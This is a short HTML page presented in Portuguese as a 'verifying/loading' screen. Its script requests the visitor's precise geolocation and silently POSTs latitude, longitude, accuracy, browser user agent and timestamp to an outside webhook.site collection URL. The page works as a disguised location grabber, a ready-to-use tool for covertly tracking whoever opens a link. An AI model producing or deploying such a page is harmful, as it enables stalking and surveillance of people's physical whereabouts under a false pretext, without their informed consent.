<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Verificando...</title>
</head>
<body>
<h2>Carregando...</h2>

<script>
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function(pos) {

    fetch("https://webhook.site/10171ff7-5eb4-4769-8d31-ebdffcdf7083", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        precisao: pos.coords.accuracy,
        navegador: navigator.userAgent,
        horario: new Date().toString()
      })
    });

    document.body.innerHTML = "Localização enviada.";
  },
  function(err) {
    document.body.innerHTML = "Permissão negada ou erro: " + err.message;
  },
  {
    enableHighAccuracy: true
  });
} else {
  document.body.innerHTML = "Geolocalização não suportada.";
}
</script>

</body>
</html>
